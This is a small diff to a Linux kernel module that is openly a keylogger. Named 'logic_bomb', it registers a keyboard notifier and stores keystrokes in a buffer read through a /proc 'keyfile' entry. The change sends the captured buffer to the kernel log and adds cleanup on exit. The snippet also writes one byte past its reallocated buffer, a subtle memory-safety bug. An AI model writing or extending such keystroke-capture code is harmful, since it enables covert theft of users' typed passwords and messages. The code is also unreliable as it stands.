@@ -26,7 +26,8 @@ static int file_show(struct seq_file *m, void *v)
 {
     buffer = krealloc( buffer, len + 1, GFP_KERNEL);
     buffer[len+1] = '\0';
-    seq_printf(m, "Keylogger: %s \n", buffer);
+    printk(KERN_INFO "Buffer content %s \n", buffer);
+    //seq_printf(m, "Keylogger: %s \n", buffer);
     return 0;
 }
 
@@ -125,6 +126,7 @@ static int __init logic_bomb_init( void ) {
 }
 
 static void __exit logic_bomb_exit( void ) {
+    kfree(buffer);
     remove_proc_entry("keyfile", NULL);
     unregister_keyboard_notifier(&nb);
 }
